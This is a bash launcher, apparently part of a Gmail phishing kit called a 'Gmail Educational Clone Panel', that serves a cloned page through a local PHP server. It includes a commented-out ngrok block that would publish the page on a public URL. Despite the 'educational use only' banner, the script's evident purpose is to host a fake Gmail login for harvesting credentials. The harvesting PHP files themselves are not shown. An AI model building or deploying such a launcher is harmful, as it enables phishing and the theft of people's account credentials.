#!/bin/bash
# Gmail Educational Clone Panel – launcher                by Tarek 2025

clear
echo "###############################################"
echo "# ⚠️  WARNING: EDUCATIONAL USE ONLY            #"
echo "# This tool is for authorized lab testing.     #"
echo "# Misuse = illegal.                            #"
echo "###############################################"
read -p "I agree to the terms (y/n): " AGREE
[[ "$AGREE" != "y" ]] && { echo "[✗] Exiting."; exit 1; }

PORT=8080
echo "[+] Starting PHP on $PORT ..."
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
PHP_PID=$!

# >>> If you REALLY want ngrok, remove the exit below and uncomment the block.
echo "[i] Ngrok tunnel disabled by default (safety)."
echo "[i] Open  http://127.0.0.1:$PORT  in your browser."
# ---------------------------------------------------
# if command -v ngrok >/dev/null 2>&1; then
#   echo "[+] Launching ngrok ..."
#   ngrok http $PORT > /dev/null 2>&1 &
#   sleep 4
#   LINK=$(curl -s http://127.0.0.1:4040/api/tunnels | \
#          grep -o 'https://[0-9a-zA-Z.-]*\\.ngrok[-free]*\\.app')
#   echo "[✓] External link: $LINK"
# fi
# ---------------------------------------------------

# open panel automatically (works on most desktop environments)
command -v xdg-open >/dev/null 2>&1 && \
  xdg-open http://127.0.0.1:$PORT/panel.php

trap ctrl_c INT
ctrl_c() {
  echo -e "\n[+] Stopping server ..."
  kill $PHP_PID 2>/dev/null
  pkill ngrok 2>/dev/null
  exit
}
while true; do sleep 1; done
